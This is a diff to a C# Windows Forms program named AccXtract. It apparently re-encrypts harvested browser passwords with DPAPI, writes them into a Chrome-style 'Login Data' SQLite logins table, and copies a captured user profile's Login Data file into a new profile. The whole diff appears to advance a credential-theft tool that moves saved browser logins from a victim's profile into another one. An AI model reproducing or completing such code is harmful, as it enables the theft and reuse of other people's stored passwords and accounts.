@@ -27,6 +27,7 @@ using System.IO;
 using System.Text;
 using System.Windows.Forms;
 using System.Data.SQLite;
+using System.Runtime.InteropServices;
 
 namespace AccXtract
 {
@@ -216,10 +217,17 @@ namespace AccXtract
                     {
                         passwords.Add(data[i]);
 
-                        string encryptedPassword = DPAPI.Encrypt(data[i]);
+                        string decryptedPassword = data[i];
+                        byte[] decryptedPassBytes = Encoding.ASCII.GetBytes(decryptedPassword);
+                        byte[] encryptedPassword = DPAPI.encryptBytes(decryptedPassBytes);
+                        //byte[] binEncryptedPassword = System.Text.Encoding.ASCII.GetBytes(encryptedPassword);
+
 
                         SQLiteCommand replaceData = conn.CreateCommand();
-                        replaceData.CommandText = "UPDATE logins SET password_value = \"" + encryptedPassword + "\" WHERE action_url = \"" + data[i - 2] + "\"";
+                        replaceData.CommandText = "UPDATE logins SET password_value = @pass WHERE action_url = \"" + data[i - 2] + "\"";
+                        SQLiteParameter param = new SQLiteParameter("@pass", DbType.Binary);
+                        param.Value = encryptedPassword;
+                        replaceData.Parameters.Add(param);
                         replaceData.ExecuteNonQuery();
                     }
                 }
@@ -228,7 +236,7 @@ namespace AccXtract
 
                 //End re-encryption
 
-                
+                File.Copy(capturedUserProfile + "\\Login Data", newUserProfile + "\\Login Data", true);
 
                 
 
@@ -340,6 +348,27 @@ namespace AccXtract
         private void Form1_Load(object sender, EventArgs e)
         {
 
+        }
+
+        private static void InitBLOB(byte[] data, ref DPAPI.DATA_BLOB blob)
+        {
+            // Use empty array for null parameter.
+            if (data == null)
+                data = new byte[0];
+
+            // Allocate memory for the BLOB data.
+            blob.pbData = Marshal.AllocHGlobal(data.Length);
+
+            // Make sure that memory allocation was successful.
+            if (blob.pbData == IntPtr.Zero)
+                throw new Exception(
+                    "Unable to allocate data buffer for BLOB structure.");
+
+            // Specify number of bytes in the BLOB.
+            blob.cbData = data.Length;
+
+            // Copy data from original source to the BLOB structure.
+            Marshal.Copy(data, 0, blob.pbData, data.Length);
         }
     }
 }
